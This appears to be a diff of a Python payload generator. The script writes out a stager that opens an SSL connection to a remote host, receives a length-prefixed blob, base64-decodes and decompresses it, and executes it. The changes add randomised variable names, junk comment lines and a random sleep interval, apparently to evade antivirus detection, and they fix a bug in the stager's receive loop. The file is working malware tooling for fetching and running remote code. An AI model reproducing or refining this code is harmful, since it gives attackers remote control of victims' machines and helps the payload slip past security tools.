@@ -12,17 +12,26 @@ import string
 import random
 from pickle import GLOBAL
 bind=0
-## RandomVariable
+## RandomVariables
+nonce1=secrets.randbelow(14)
+nonce2=secrets.randbelow(14)
+UltimateRandomNumberhigh = random.randint(15,30)
+UltimateRandomNumberlow=secrets.randbelow(nonce1)
+UltimateRandomNumberhigh2 = random.randint(15,30)
+UltimateRandomNumberlow2=secrets.randbelow(nonce2)
+sleeptime = secrets.randbelow(12)
 VariableRange = random.randint(8,22)
 VariableRange2 = random.randint(8,22)
 VariableRange3 = random.randint(8,22)
-RandomisationNum = random.randint(0,77)
+RandomisationNum = random.randint(UltimateRandomNumberlow,UltimateRandomNumberhigh)
+RandomisationNum2 = random.randint(UltimateRandomNumberlow2,UltimateRandomNumberhigh2)
 c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
 d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
 so=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
 s=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
 l=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
 dr=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
+## jesus christ that was a LOT of random variables (and there are even more hidden away)
 reps=False
 def logo():
     logo1 = """
@@ -228,8 +237,8 @@ if int(certainty)>0.5:
 import zlib,base64,ssl,socket,struct,time
 '''
         ina.write(b)
-        for i in range(int(RandomisationNum)):
-            b3=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,19)))))
+        for i in range(int(RandomisationNum2)):
+            b3=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,7)))))
             ina.write('#'+b3+'\n')
         b2 = '''
 for x in range(10):
@@ -238,11 +247,15 @@ for x in range(10):
 		'''+so+'''.connect(('''+c+''','''+d+'''))
 		'''+s+'''=ssl.wrap_socket('''+so+''')
 		break
+
+
 	except:
-		time.sleep(10)
+		time.sleep('''+str(sleeptime)+''')
+
+
 '''+l+'''=struct.unpack('>I','''+s+'''.recv(4))[0]
 '''+dr+'''='''+s+'''.recv('''+l+''')
-while len(d)<'''+l+''':
+while len('''+dr+''')<'''+l+''':
 	'''+dr+'''+='''+s+'''.recv('''+l+'''-len('''+dr+'''))
 exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
 '''
